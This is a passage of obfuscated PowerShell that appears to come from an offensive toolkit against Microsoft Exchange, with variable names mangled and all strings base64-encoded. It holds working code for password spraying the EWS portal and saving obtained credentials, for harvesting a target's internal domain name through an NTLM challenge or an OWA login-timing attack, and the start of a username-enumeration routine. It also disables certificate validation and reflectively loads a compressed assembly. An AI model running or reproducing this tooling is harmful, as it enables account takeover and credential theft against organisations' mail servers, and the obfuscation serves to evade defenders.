                    if (${/=\__/\_/\/==\/=\} -like $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgBFAHgAYwBoAGEAbgBnAGUAIABTAGUAcgB2AGUAcgAgAGQAbwBlAHMAbgAnAHQAIABzAHUAcABwAG8AcgB0ACAAdABoAGUAIAByAGUAcQB1AGUAcwB0AGUAZAAgAHYAZQByAHMAaQBvAG4ALgAqAA=='))))
                    {
                        echo $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqAF0AIABFAFIAUgBPAFIAOgAgAFQAaABlACAAYwBvAG4AbgBlAGMAdABpAG8AbgAgAHQAbwAgAEUAeABjAGgAYQBuAGcAZQAgAGYAYQBpAGwAZQBkACAAdQBzAGkAbgBnACAARQB4AGMAaABhAG4AZwBlACAAVgBlAHIAcwBpAG8AbgAgACQARQB4AGMAaABhAG4AZwBlAFYAZQByAHMAaQBvAG4ALgA=')))
                        echo $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqAF0AIABUAHIAeQAgAHMAZQB0AHQAaQBuAGcAIAB0AGgAZQAgAC0ARQB4AGMAaABhAG4AZwBlAFYAZQByAHMAaQBvAG4AIABmAGwAYQBnACAAdABvACAAdABoAGUAIABFAHgAYwBoAGEAbgBnAGUAIAB2AGUAcgBzAGkAbwBuACAAbwBmACAAdABoAGUAIABzAGUAcgB2AGUAcgAuAA==')))
                        echo $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqAF0AIABTAG8AbQBlACAAbwBwAHQAaQBvAG4AcwAgAHQAbwAgAHQAcgB5ADoAIABFAHgAYwBoAGEAbgBnAGUAMgAwADAANwBfAFMAUAAxACwAIABFAHgAYwBoAGEAbgBnAGUAMgAwADEAMAAsACAARQB4AGMAaABhAG4AZwBlADIAMAAxADAAXwBTAFAAMQAsACAARQB4AGMAaABhAG4AZwBlADIAMAAxADAAXwBTAFAAMgAsACAARQB4AGMAaABhAG4AZwBlADIAMAAxADMALAAgAG8AcgAgAEUAeABjAGgAYQBuAGcAZQAyADAAMQAzAF8AUwBQADEALgA=')))
                        break
                    }
                }   
            }
        } -ArgumentList ${/=\_/\__/\/===\/\}[$_], ${_/\___/=\__/==\/=}, $ExchHostname, $Mailbox, $ExchangeVersion, $Password, ${/=\__/===\/\____/}, $Domain | Out-Null
    }
    ${__/==\/\__/=\/===} = Get-Date
    ${_/=\_/\_/========} = 10000
    ${_/=\_/==\__/=\/==} = 200
        ${_/\/\/\/===\_/=\_} = @()
    While ($(gjb -State Running).count -gt 0){
        ${/===\__/=\/\_/\/\} = ""
        ForEach (${_/\/\/=\__/=\____}  in $(gjb -state running)){${/===\__/=\/\_/\/\} += ", $(${_/\/\/=\__/=\____}.name)"}
        ${/===\__/=\/\_/\/\} = ${/===\__/=\/\_/\/\}.Substring(2)
        Write-Progress  -Activity $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABhAHMAcwB3AG8AcgBkACAAUwBwAHIAYQB5AGkAbgBnACAAdABoAGUAIABFAFcAUwAgAHAAbwByAHQAYQBsACAAYQB0ACAAaAB0AHQAcABzADoALwAvACQARQB4AGMAaABIAG8AcwB0AG4AYQBtAGUALwBFAFcAUwAvAEUAeABjAGgAYQBuAGcAZQAuAGEAcwBtAHgALgAgAFMAaQB0ACAAdABpAGcAaAB0AC4ALgAuAA=='))) -Status "$($(gjb -State Running).count) threads remaining" -PercentComplete ($(gjb -State Completed).count / $(gjb).count * 100)
        If ($(New-TimeSpan ${__/==\/\__/=\/===} $(Get-Date)).totalseconds -ge ${_/=\_/\_/========}){$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SwBpAGwAbABpAG4AZwAgAGEAbABsACAAagBvAGIAcwAgAHMAdABpAGwAbAAgAHIAdQBuAG4AaQBuAGcAIAAuACAALgAgAC4A')));gjb -State Running | rjb -Force}
        sleep -Milliseconds ${_/=\_/==\__/=\/==}
        ForEach(${_/\/\/=\__/=\____} in gjb){
            ${_/=\__/\_/\/=\/\_} = rcjb ${_/\/\/=\__/=\____}
            echo ${_/=\__/\_/\/=\/\_}
            ${_/\/\/\/===\_/=\_} += ${_/=\__/\_/\/=\/\_}
        }
}
    echo ($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqAF0AIABBACAAdABvAHQAYQBsACAAbwBmACAA'))) + ${_/\/\/\/===\_/=\_}.count + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IABjAHIAZQBkAGUAbgB0AGkAYQBsAHMAIAB3AGUAcgBlACAAbwBiAHQAYQBpAG4AZQBkAC4A'))))
    if ($OutFile -ne "")
    {
        ${_/\/\/\/===\_/=\_} = ${_/\/\/\/===\_/=\_} -replace $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XABbAFwAKgBcAF0AIABTAFUAQwBDAEUAUwBTACEAIABVAHMAZQByADoA'))),''
        ${_/\/\/\/===\_/=\_} = ${_/\/\/\/===\_/=\_} -replace $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IABQAGEAcwBzAHcAbwByAGQAOgA='))), ":"
        ${_/\/\/\/===\_/=\_} | Out-File -Encoding ascii $OutFile
        echo $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAcwAgAGgAYQB2AGUAIABiAGUAZQBuACAAdwByAGkAdAB0AGUAbgAgAHQAbwAgACQATwB1AHQARgBpAGwAZQAuAA==')))
    }
}
function __/=\_/==\___/\___{
    ${/=\__/\/\__/\/\/=} = New-Object IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String(${/==\/====\/=\_/\_}),[IO.Compression.CompressionMode]::Decompress)
    ${/=\__/===\/\____/} = New-Object Byte[](1092608)
    ${/=\__/\/\__/\/\/=}.Read(${/=\__/===\/\____/}, 0, 1092608) | Out-Null
    ${_/\/\/\/\__/\/=\_} = [Reflection.Assembly]::Load(${/=\__/===\/\____/})
}
function Invoke-DomainHarvestOWA {
  Param(
    [Parameter(Position = 0, Mandatory = $True)]
    [system.URI]
    $ExchHostname = "",
    [Parameter(Position = 1, Mandatory = $false)]
    [string]
    $OutFile = "",
    [Parameter(Position = 2, Mandatory = $False)]
    [string]
    $DomainList = "",
    [Parameter(Position = 3, Mandatory = $False)]
    [string]
    $CompanyName = "",
    [Parameter(Position = 4, Mandatory = $False)]
    [switch]
    $Brute
  )
    Write-Host -ForegroundColor $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('eQBlAGwAbABvAHcA'))) $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqAF0AIABIAGEAcgB2AGUAcwB0AGkAbgBnACAAZABvAG0AYQBpAG4AIABuAGEAbQBlACAAZgByAG8AbQAgAHQAaABlACAAcwBlAHIAdgBlAHIAIABhAHQAIAAkAEUAeABjAGgASABvAHMAdABuAGEAbQBlAA==')))
    ${_/=\/=====\__/\_/=} = ($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcABzADoALwAvAA=='))) + $ExchHostname + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LwBvAHcAYQAvAGEAdQB0AGgALgBvAHcAYQA='))))
    ${_/===\__/==\_/\/==} = ($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcABzADoALwAvAA=='))) + $ExchHostname + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LwBvAHcAYQAvAA=='))))
    ${_/===\/\__/===\_/} = ($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcABzADoALwAvAA=='))) + $ExchHostname + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LwBhAHUAdABvAGQAaQBzAGMAbwB2AGUAcgAvAGEAdQB0AG8AZABpAHMAYwBvAHYAZQByAC4AeABtAGwA'))))
    ${_/=\/=====\_/==\/} = ($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcABzADoALwAvAA=='))) + $ExchHostname + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LwBFAFcAUwAvAEUAeABjAGgAYQBuAGcAZQAuAGEAcwBtAHgA'))))
    ${/==\__/=\/\/=\_/=}=New-Object Microsoft.CSharp.CSharpCodeProvider
    ${/\_____/=\__/\__/}=${/==\__/=\/\/=\_/=}.CreateCompiler()
    ${__/\/\_/\_/\_/\__}=New-Object System.CodeDom.Compiler.CompilerParameters
    ${__/\/\_/\_/\_/\__}.GenerateExecutable=$False
    ${__/\/\_/\_/\_/\__}.GenerateInMemory=$True
    ${__/\/\_/\_/\_/\__}.IncludeDebugInformation=$False
    ${__/\/\_/\_/\_/\__}.ReferencedAssemblies.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB5AHMAdABlAG0ALgBEAEwATAA=')))) > $null
    ${__/=\/\_/===\__/=}=$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IAAgACAAIABuAGEAbQBlAHMAcABhAGMAZQAgAEwAbwBjAGEAbAAuAFQAbwBvAGwAawBpAHQARQB4AHQAZQBuAHMAaQBvAG4AcwAuAE4AZQB0AC4AQwBlAHIAdABpAGYAaQBjAGEAdABlAFAAbwBsAGkAYwB5AHsADQAKACAAIAAgACAAIAAgAHAAdQBiAGwAaQBjACAAYwBsAGEAcwBzACAAVAByAHUAcwB0AEEAbABsACAAOgAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBJAEMAZQByAHQAaQBmAGkAYwBhAHQAZQBQAG8AbABpAGMAeQAgAHsADQAKACAAIAAgACAAIAAgACAAIABwAHUAYgBsAGkAYwAgAFQAcgB1AHMAdABBAGwAbAAoACkAIAB7ACAADQAKACAAIAAgACAAIAAgACAAIAB9AA0ACgAgACAAIAAgACAAIAAgACAAcAB1AGIAbABpAGMAIABiAG8AbwBsACAAQwBoAGUAYwBrAFYAYQBsAGkAZABhAHQAaQBvAG4AUgBlAHMAdQBsAHQAKABTAHkAcwB0AGUAbQAuAE4AZQB0AC4AUwBlAHIAdgBpAGMAZQBQAG8AaQBuAHQAIABzAHAALAANAAoAIAAgACAAIAAgACAAIAAgACAAIABTAHkAcwB0AGUAbQAuAFMAZQBjAHUAcgBpAHQAeQAuAEMAcgB5AHAAdABvAGcAcgBhAHAAaAB5AC4AWAA1ADAAOQBDAGUAcgB0AGkAZgBpAGMAYQB0AGUAcwAuAFgANQAwADkAQwBlAHIAdABpAGYAaQBjAGEAdABlACAAYwBlAHIAdAAsACAADQAKACAAIAAgACAAIAAgACAAIAAgACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAFIAZQBxAHUAZQBzAHQAIAByAGUAcQAsACAAaQBuAHQAIABwAHIAbwBiAGwAZQBtACkAIAB7AA0ACgAgACAAIAAgACAAIAAgACAAIAAgAHIAZQB0AHUAcgBuACAAdAByAHUAZQA7AA0ACgAgACAAIAAgACAAIAAgACAAfQANAAoAIAAgACAAIAAgACAAfQANAAoAIAAgACAAIAB9AA=='))) 
    ${_/=\_/\_/=\___/\_}=${/==\__/=\/\/=\_/=}.CompileAssemblyFromSource(${__/\/\_/\_/\_/\__},${__/=\/\_/===\__/=})
    ${_/\_/======\__/==}=${_/=\_/\_/=\___/\_}.CompiledAssembly
    ${__/\_/==\________}=${_/\_/======\__/==}.CreateInstance($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABvAGMAYQBsAC4AVABvAG8AbABrAGkAdABFAHgAdABlAG4AcwBpAG8AbgBzAC4ATgBlAHQALgBDAGUAcgB0AGkAZgBpAGMAYQB0AGUAUABvAGwAaQBjAHkALgBUAHIAdQBzAHQAQQBsAGwA'))))
    [System.Net.ServicePointManager]::CertificatePolicy=${__/\_/==\________}
    if ($Brute)
    {
    ${/==\_/=\___/==\/\} = @()
    if ($DomainList -ne "") {
        ${/==\_/=\___/==\/\} += gc $DomainList
    }
    elseif ($CompanyName -ne "") {
        ${/==\_/=\___/==\/\} = ____/\_/===\_/\_/= -_/==\/=\__/======= $CompanyName
    }
    else {
        echo $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WQBvAHUAIABtAHUAcwB0ACAAcAByAG8AdgBpAGQAZQAgAGUAaQB0AGgAZQByACAAYQAgAEQAbwBtAGEAaQBuAEwAaQBzAHQAIABvAHIAIABhACAAQwBvAG0AcABhAG4AeQBOAGEAbQBlAA==')))
        return
    }
    $Username = -join ((65..90) + (97..122) | Get-Random -Count 10 | % {[char]$_})
    $Password = -join ((65..90) + (97..122) | Get-Random -Count 10 | % {[char]$_})
    ${/=\/\_/\___/\/\__} = @()
    ${____/\_/=\/\_/\/\} = @{}
    ${/=\/====\_/\/=\/\} = 0 
    ${/==\_/====\_/==\/} = _/=====\/\__/\_/== -_/=\/=====\__/\_/= ${_/=\/=====\__/\_/=} -_/===\__/==\_/\/== ${_/===\__/==\_/\/==}
    ${_/=\/\_/====\/==\} = ${/==\_/====\_/==\/} * 2.75
    ${_/\/\/\/===\_/=\_} = @()
    Write-Host $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABoAHIAZQBzAGgAbwBsAGQAOgAgACQAewA0ADAAfQA=')))
    Write-Host ""
	Write-Host $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAcABvAG4AcwBlACAAVABpAG0AZQAgACgATQBTACkAIAAJACAARABvAG0AYQBpAG4AXABVAHMAZQByAG4AYQBtAGUA')))
    ForEach(${/=\/\_/=\/=====\_} in ${/==\_/=\___/==\/\})
    {
        $ProgressPreference = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBpAGwAZQBuAHQAbAB5AGMAbwBuAHQAaQBuAHUAZQA=')))
        ${/==\_/\/=\/=\_/\_} = @{destination=$ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7AGYAMwB9AA==')));flags='4';forcedownlevel='0';username=$ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7ADEANgAzAH0AXAAkAFUAcwBlAHIAbgBhAG0AZQA=')));password=$ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABQAGEAcwBzAHcAbwByAGQA')));isUtf8='1'}
        ${_/\/=\_/=\__/\/\/} = iwr -Uri ${_/=\/=====\__/\_/=} -Method POST -Body ${/==\_/\/=\/=\_/\_} -MaximumRedirection 0 -SessionVariable owasession -ErrorAction SilentlyContinue 
        ${_/==\_/==\____/==} = [system.diagnostics.stopwatch]::startNew()
        ${_/\/=\_/=\__/\/\/} = iwr -Uri ${_/=\/=====\__/\_/=} -Method POST -Body ${/==\_/\/=\/=\_/\_} -MaximumRedirection 0 -SessionVariable owasession -ErrorAction SilentlyContinue 
        ${/========\/==\_/\} = [double]${_/==\_/==\____/==}.ElapsedMilliseconds
		Write-Host $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7ADMAfQAgAAkACQAJACAAJAB7ADEANgAzAH0AXAAkAHUAcwBlAHIAbgBhAG0AZQA=')))
		if (${/========\/==\_/\} -ge ${_/=\/\_/====\/==\} )
        {
            Write-Host -ForegroundColor $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('eQBlAGwAbABvAHcA'))) $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqAF0AIABQAG8AdABlAG4AdABpAGEAbAB5ACAAVgBhAGwAaQBkACAARABvAG0AYQBpAG4AIQAgAEQAbwBtAGEAaQBuADoAJAB7ADEANgAzAH0A')))
            ${_/\/\/\/===\_/=\_} += ${/=\/\_/=\/=====\_}
        }
    }
    Write-Host -ForegroundColor $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('eQBlAGwAbABvAHcA'))) ($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqAF0AIABBACAAdABvAHQAYQBsACAAbwBmACAA'))) + ${_/\/\/\/===\_/=\_}.count + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IABwAG8AdABlAG4AdABpAGEAbABsAHkAIAB2AGEAbABpAGQAIABkAG8AbQBhAGkAbgBzACAAZgBvAHUAbgBkAC4A'))))
    if ($OutFile -ne "") {
            ${_/\/\/\/===\_/=\_} | Out-File -Encoding ascii $OutFile
            Write-Host $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAcwAgAGgAYQB2AGUAIABiAGUAZQBuACAAdwByAGkAdAB0AGUAbgAgAHQAbwAgACQATwB1AHQARgBpAGwAZQAuAA==')))
    }
    }
    else
    {
    try 
    {
        ${_/===\_/\/\/\/\/\} = iwr -Uri ${_/===\/\__/===\_/} -Method Post -Headers @{"Authorization" = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBUAEwATQAgAFQAbABSAE0AVABWAE4AVABVAEEAQQBCAEEAQQBBAEEAQgA0AEkASQBvAGcAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEARwBBAGIARQBkAEEAQQBBAEEARAB3AD0APQA=')))}
    }
    catch
    {
        ${_/===\_/\/\/\/\/\} = $_.Exception.Response
        If (${_/===\_/\/\/\/\/\}.StatusCode -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAdQB0AGgAbwByAGkAegBlAGQA'))))
        {
            ${_/====\__/\____/=} = ${_/===\_/\/\/\/\/\}.Headers
            foreach (${_/==\/\/\_/\__/\/} in ${_/====\__/\____/=})
            {
                if (${_/==\/\/\_/\__/\/} -like $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBXAFcALQBBAHUAdABoAGUAbgB0AGkAYwBhAHQAZQA='))))
                {
                ${_/\______/==\/=\_} = $(${_/====\__/\____/=}[${_/==\/\/\_/\__/\/}]) -split $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LAB8AFwAcwA=')))
                ${/=\/\/==\_/=\___/} = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String(${_/\______/==\/=\_}[1]))
                ${/==\/\/=\/==\_/=\} = ${/=\/\/==\_/=\___/} -replace $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBeAFwAeAAyADEALQBcAHgAMwA5AFwAeAA0ADEALQBcAHgANQBBAFwAeAA2ADEALQBcAHgANwBBAF0AKwA='))), ','
                ${____/\_/===\/\/\/} = @()
                ${____/\_/===\/\/\/} = ${/==\/\/=\/==\_/=\} -split ','
                Write-Host ($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABoAGUAIABkAG8AbQBhAGkAbgAgAGEAcABwAGUAYQByAHMAIAB0AG8AIABiAGUAOgAgAA=='))) + ${____/\_/===\/\/\/}[7])
                }
            }
        }
        else
        {
            echo $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqAF0AIABDAG8AdQBsAGQAbgAnAHQAIABnAGUAdAAgAGQAbwBtAGEAaQBuACAAZgByAG8AbQAgAEEAdQB0AG8AZABpAHMAYwBvAHYAZQByACAAVQBSAEwALgAgAFQAcgB5AGkAbgBnACAARQBXAFMAIABVAFIATAAuAC4ALgA=')))
            try 
            {
                ${_/===\_/\/\/\/\/\} = iwr -Uri ${_/=\/=====\_/==\/} -Method Post -Headers @{"Authorization" = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBUAEwATQAgAFQAbABSAE0AVABWAE4AVABVAEEAQQBCAEEAQQBBAEEAQgA0AEkASQBvAGcAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEARwBBAGIARQBkAEEAQQBBAEEARAB3AD0APQA=')))}
            }
            catch
            {
                ${_/===\_/\/\/\/\/\} = $_.Exception.Response
                If (${_/===\_/\/\/\/\/\}.StatusCode -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAdQB0AGgAbwByAGkAegBlAGQA'))))
                {
                    ${_/====\__/\____/=} = ${_/===\_/\/\/\/\/\}.Headers
                    foreach (${_/==\/\/\_/\__/\/} in ${_/====\__/\____/=})
                    {
                        if (${_/==\/\/\_/\__/\/} -like $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBXAFcALQBBAHUAdABoAGUAbgB0AGkAYwBhAHQAZQA='))))
                        {
                        ${_/\______/==\/=\_} = $(${_/====\__/\____/=}[${_/==\/\/\_/\__/\/}]) -split $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LAB8AFwAcwA=')))
                        ${/=\/\/==\_/=\___/} = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String(${_/\______/==\/=\_}[1]))
                        ${/==\/\/=\/==\_/=\} = ${/=\/\/==\_/=\___/} -replace $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBeAFwAeAAyADEALQBcAHgAMwA5AFwAeAA0ADEALQBcAHgANQBBAFwAeAA2ADEALQBcAHgANwBBAF0AKwA='))), ','
                        ${____/\_/===\/\/\/} = @()
                        ${____/\_/===\/\/\/} = ${/==\/\/=\/==\_/=\} -split ','
                        Write-Host ($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABoAGUAIABkAG8AbQBhAGkAbgAgAGEAcABwAGUAYQByAHMAIAB0AG8AIABiAGUAOgAgAA=='))) + ${____/\_/===\/\/\/}[7])
                        }
                    }
                }
                else
                {
                echo $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqAF0AIABDAG8AdQBsAGQAbgAnAHQAIABnAGUAdAAgAGQAbwBtAGEAaQBuACAAZgByAG8AbQAgAEUAVwBTAC4AIABUAHIAeQAgAHQAaABlACAAdABpAG0AaQBuAGcAIABhAHQAdABhAGMAawAgAGIAeQAgAHMAcABlAGMAaQBmAHkAaQBuAGcAIABhACAAbABpAHMAdAAgAG8AZgAgAHAAbwBzAHMAaQBiAGwAZQAgAGQAbwBtAGEAaQBuAHMAIABhAG4AZAAgAHUAcwBlACAAdABoAGUAIAAtAGIAcgB1AHQAZQAgAG8AcAB0AGkAbwBuAC4A')))
                echo $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SABlAHIAZQAgAGkAcwAgAGEAbgAgAGUAeABhAG0AcABsAGUAOgAgAEkAbgB2AG8AawBlAC0ARABvAG0AYQBpAG4ASABhAHIAdgBlAHMAdABPAFcAQQAgAC0ARQB4AGMAaABIAG8AcwB0AG4AYQBtAGUAIAAkAEUAeABjAGgASABvAHMAdABuAGEAbQBlACAALQBEAG8AbQBhAGkAbgBMAGkAcwB0ACAALgBcAGQAbwBtAGEAaQBuAGwAaQBzAHQALgB0AHgAdAAgAC0ATwB1AHQARgBpAGwAZQAgAHAAbwB0AGUAbgB0AGkAYQBsAGwAeQAtAHYAYQBsAGkAZAAtAGQAbwBtAGEAaQBuAHMALgB0AHgAdAAgAC0AQgByAHUAdABlAA==')))    
                }
            }
        }
    }
    }
}
function Invoke-UsernameHarvestOWA {
  Param(
    [Parameter(Position = 0, Mandatory = $True)]
    [system.URI]
    $ExchHostname = "",
    [Parameter(Position = 1, Mandatory = $True)]
    [string]
    $OutFile = "",
    [Parameter(Position = 2, Mandatory = $True)]
    [string]
    $UserList = "",
    [Parameter(Position = 3, Mandatory = $False)]
    [string]
    $Password = "",
    [Parameter(Position = 4, Mandatory = $False)]
    [string]
    $Domain = "",
    [Parameter(Position = 5, Mandatory = $False)]
    [string]
    $Threads = "1"
  )
    Write-Host -ForegroundColor $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('eQBlAGwAbABvAHcA'))) $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqAF0AIABOAG8AdwAgAHMAcAByAGEAeQBpAG4AZwAgAHQAaABlACAATwBXAEEAIABwAG8AcgB0AGEAbAAgAGEAdAAgAGgAdAB0AHAAcwA6AC8ALwAkAEUAeABjAGgASABvAHMAdABuAGEAbQBlAC8AbwB3AGEALwA=')))
    ${_/=\/=====\__/\_/=} = ($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcABzADoALwAvAA=='))) + $ExchHostname + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LwBvAHcAYQAvAGEAdQB0AGgALgBvAHcAYQA='))))
    ${_/===\__/==\_/\/==} = ($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcABzADoALwAvAA=='))) + $ExchHostname + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LwBvAHcAYQAvAA=='))))
    ${__/\_/=\_/=\_/\_/} = @()
    ${__/\_/=\_/=\_/\_/} += gc $UserList
    ${______/=\__/\/\__} = @()
    ${/=\/====\_/\/=\/\} = ${__/\_/=\_/=\_/\_/}.count
    if ($Password -eq "") {
        $Password = -join ((65..90) + (97..122) | Get-Random -Count 12 | % {[char]$_})
    }
    ${/==\__/=\/\/=\_/=}=New-Object Microsoft.CSharp.CSharpCodeProvider
    ${/\_____/=\__/\__/}=${/==\__/=\/\/=\_/=}.CreateCompiler()
    ${__/\/\_/\_/\_/\__}=New-Object System.CodeDom.Compiler.CompilerParameters
    ${__/\/\_/\_/\_/\__}.GenerateExecutable=$False
    ${__/\/\_/\_/\_/\__}.GenerateInMemory=$True
    ${__/\/\_/\_/\_/\__}.IncludeDebugInformation=$False
    ${__/\/\_/\_/\_/\__}.ReferencedAssemblies.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB5AHMAdABlAG0ALgBEAEwATAA=')))) > $null
    ${__/=\/\_/===\__/=}=$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IAAgACAAIABuAGEAbQBlAHMAcABhAGMAZQAgAEwAbwBjAGEAbAAuAFQAbwBvAGwAawBpAHQARQB4AHQAZQBuAHMAaQBvAG4AcwAuAE4AZQB0AC4AQwBlAHIAdABpAGYAaQBjAGEAdABlAFAAbwBsAGkAYwB5AHsADQAKACAAIAAgACAAIAAgAHAAdQBiAGwAaQBjACAAYwBsAGEAcwBzACAAVAByAHUAcwB0AEEAbABsACAAOgAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBJAEMAZQByAHQAaQBmAGkAYwBhAHQAZQBQAG8AbABpAGMAeQAgAHsADQAKACAAIAAgACAAIAAgACAAIABwAHUAYgBsAGkAYwAgAFQAcgB1AHMAdABBAGwAbAAoACkAIAB7ACAADQAKACAAIAAgACAAIAAgACAAIAB9AA0ACgAgACAAIAAgACAAIAAgACAAcAB1AGIAbABpAGMAIABiAG8AbwBsACAAQwBoAGUAYwBrAFYAYQBsAGkAZABhAHQAaQBvAG4AUgBlAHMAdQBsAHQAKABTAHkAcwB0AGUAbQAuAE4AZQB0AC4AUwBlAHIAdgBpAGMAZQBQAG8AaQBuAHQAIABzAHAALAANAAoAIAAgACAAIAAgACAAIAAgACAAIABTAHkAcwB0AGUAbQAuAFMAZQBjAHUAcgBpAHQAeQAuAEMAcgB5AHAAdABvAGcAcgBhAHAAaAB5AC4AWAA1ADAAOQBDAGUAcgB0AGkAZgBpAGMAYQB0AGUAcwAuAFgANQAwADkAQwBlAHIAdABpAGYAaQBjAGEAdABlACAAYwBlAHIAdAAsACAADQAKACAAIAAgACAAIAAgACAAIAAgACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAFIAZQBxAHUAZQBzAHQAIAByAGUAcQAsACAAaQBuAHQAIABwAHIAbwBiAGwAZQBtACkAIAB7AA0ACgAgACAAIAAgACAAIAAgACAAIAAgAHIAZQB0AHUAcgBuACAAdAByAHUAZQA7AA0ACgAgACAAIAAgACAAIAAgACAAfQANAAoAIAAgACAAIAAgACAAfQANAAoAIAAgACAAIAB9AA=='))) 
    ${_/=\_/\_/=\___/\_}=${/==\__/=\/\/=\_/=}.CompileAssemblyFromSource(${__/\/\_/\_/\_/\__},${__/=\/\_/===\__/=})
    ${_/\_/======\__/==}=${_/=\_/\_/=\___/\_}.CompiledAssembly
    ${__/\_/==\________}=${_/\_/======\__/==}.CreateInstance($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABvAGMAYQBsAC4AVABvAG8AbABrAGkAdABFAHgAdABlAG4AcwBpAG8AbgBzAC4ATgBlAHQALgBDAGUAcgB0AGkAZgBpAGMAYQB0AGUAUABvAGwAaQBjAHkALgBUAHIAdQBzAHQAQQBsAGwA'))))
    [System.Net.ServicePointManager]::CertificatePolicy=${__/\_/==\________}
    for( ${_/\/==\___/=\_/\_} = 0; ${_/\/==\___/=\_/\_} -lt 5; ${_/\/==\___/=\_/\_}++ ){
        ${______/=\__/\/\__} += -join ((65..90) + (97..122) | Get-Random -Count 6 | % {[char]$_})
    }
    ${______/=\__/\/\__} += ${__/\_/=\_/=\_/\_/}
    ${/==\_/====\_/==\/} = _/=====\/\__/\_/== -_/=\/=====\__/\_/= ${_/=\/=====\__/\_/=} -_/===\__/==\_/\/== ${_/===\__/==\_/\/==} -Domain $Domain
    ${_/=\/\_/====\/==\} = ${/==\_/====\_/==\/} * 0.6
    Write-Host $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABoAHIAZQBzAGgAbwBsAGQAOgAgACQAewA0ADAAfQA=')))
    ${_/\/\/\/===\_/=\_} = @()
